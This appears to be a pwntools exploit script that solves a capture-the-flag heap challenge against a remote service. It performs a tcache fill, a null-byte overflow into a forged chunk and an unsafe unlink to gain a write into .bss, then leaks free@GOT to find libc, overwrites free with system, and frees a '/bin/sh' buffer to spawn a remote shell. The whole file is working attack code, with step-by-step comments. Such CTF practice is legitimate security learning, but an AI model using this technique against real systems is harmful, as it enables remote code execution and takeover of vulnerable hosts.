from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")
context.log_level = "debug"

p = remote("13.234.20.50", 1339)

slots = 0x6020c0 #found by using the command nm -n ./chall | grep slots'
free_got = elf.got["free"]

S = slots + 0x10 #address of slots[1].ptr
FD = S - 0x18
BK = S - 0x10


#genereate the first chunk A cause i dont want my things at the top it's weird
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Index: ", b"0")
p.sendlineafter(b"Size: ", b"136")
p.sendafter(b"Data: ", b"A" * 136)

#generate the actual b and c chunks and chunk D is another chunk for no use.

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Index: ", b"1")
p.sendlineafter(b"Size: ", b"248")
p.sendafter(b"Data: ", b"B" * 248)

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Index: ", b"2")
p.sendlineafter(b"Size: ", b"248")
p.sendafter(b"Data: ", b"C" * 248)

#this is for generating chunks to fill up tcache for 248 bytes. or 0xf8 this allocates 0x100 on the heap including metadata so that freeing C doesn't put it in tcache'

for i in range(4, 11):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(i).encode())
    p.sendlineafter(b"Size: ", b"248")
    p.sendafter(b"Data: ", b"T" * 248)

for i in range(4, 11):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(i).encode())


#this is building the metadata for the fake chunk 1 that we are gonna make
payload  = p64(0)  #prev chunk size
payload += p64(0xf1) #current chunk size is 0xf0 and the 1 implies previous chunk is in use
payload += p64(FD) #this is the forward pointer pointing to the first element in slots - 0x18 and the glibc goes to this place adds 0x18 and sees if the pointer points back to the (compares with the pointer to the chunk P) inital chunk call it P and this place has the ptr to P which is slots[1] or the B's users usable data's address after the metadata and it dereferences it
payload += p64(BK) #this is the backward pointer which points slots[0] -0x10, as glibc whill go to this place add 0x10
payload  = payload.ljust(0xf0, b"B") #appends B padding until the payload becomes of the length 0xf0
payload += p64(0xf0) #prev size for C

p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"Index: ", b"1")
p.sendafter(b"Data: ", payload) # after this null byte overflow happens

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Index: ", b"2") #freeing C this makes it do all the checks and then combines it with P after that. And glibc unlinks P, not P and C, so it goes to the BK ptr of P, adds 0x10 as that would have been the forward pointer field of the chunk which was behind P and inserts the FD ptr there. Then it goes to the address pointed by the FD ptr of P and puts the BK pointer at the address FD points to + 0x18, as that would have been the backward pointer field of the chunk which was ahead of P. and siince we chose BK = slots[1].ptr - 0x10 and FD = slots[1].ptr - 0x18, both of these writes land on slots[1].ptr. so first BK is written there, then FD is written there, and finally slots[1].ptr becomes FD.

#slots[1].ptr now points to bss that is where our initial chunk B's ptr was stored.'


#now we will construct another fake or custom slots for got table overwrite.
fake = bytearray(b"\x00" * 248) #so first we got a null byte array of the size of slot[1] as the slot[1].size is still 0xf8
#so when we write to it the program does read(0, slots[1].ptr, slots[1].size); and now it writes into .bss


#writing into .bss starts from FD

fake[0x18:0x20] = p64(FD) #preserves slot 1
fake[0x20:0x28] = p64(248) #size of slot 1

fake[0xa8:0xb0] = p64(free_got) #for slot 10, it writes the address pointing to free@GOT at slot[10].ptr and we put 7 bytes as write size because program is going to put a null byte and we don't want it to go to next entry and corrupt it
fake[0xb0:0xb8] = p64(7)

fake[0xb8:0xc0] = p64(free_got) #for slot 11 another one that points to free@GOT to read from
fake[0xc0:0xc8] = p64(8)

p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"Index: ", b"1") #so when im editing here, it edits slot 1, but our slots[1].ptr now points to an address on BSS as found above so now we writing here to FD
p.sendafter(b"Data: ", bytes(fake))

p.sendlineafter(b"> ", b"5")
p.sendlineafter(b"Index: ", b"11") #this reads from free@GOT since the ptr at slot[11].ptr points to free@GOT
p.recvuntil(b"Data: ")
leaked_free = u64(p.recvn(8)) #it takes the address of free from GOT table and with this you can calculate offset
p.recvuntil(b"\n")

libc.address = leaked_free - libc.symbols["free"]  #calculating offset and initializing with  libc.address
system = libc.symbols["system"] #now you get actual system's address in libc which can be used to spawn a shell let's goooooooo

p.sendlineafter(b"> ", b"4") #edit 10th slot
p.sendlineafter(b"Index: ", b"10")
p.sendafter(b"Data: ", p64(system)[:7]) #send the address of system till the byte at 6th index that is the second most significant byte the last byet is put to 00, but that doesnt matter as little endian so it would make the most significant byte as 00 and it is usually 00 anyway.

p.sendlineafter(b"> ", b"1") #now you allocate at index any index, i took 8 for now since free@GOT now points to system calling free will call the the function
p.sendlineafter(b"Index: ", b"8")
p.sendlineafter(b"Size: ", b"136")
p.sendafter(b"Data: ", b"/bin/sh\x00".ljust(136, b"\x00")) # just put extra null bytes at the end for safety because in code it's given it's reading 136 byets, also 136 cause it's 0x88 and that allocates 0x90 by the glibc to the chunk'

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Index: ", b"8") #and this calls free(slots[8].ptr) but that becomes system(slots[8].ptr) after overwrite and slots[8].ptr is just /bin/sh\x00 and that becomes system(/bin/sh\x00) spawning the shell

p.interactive()
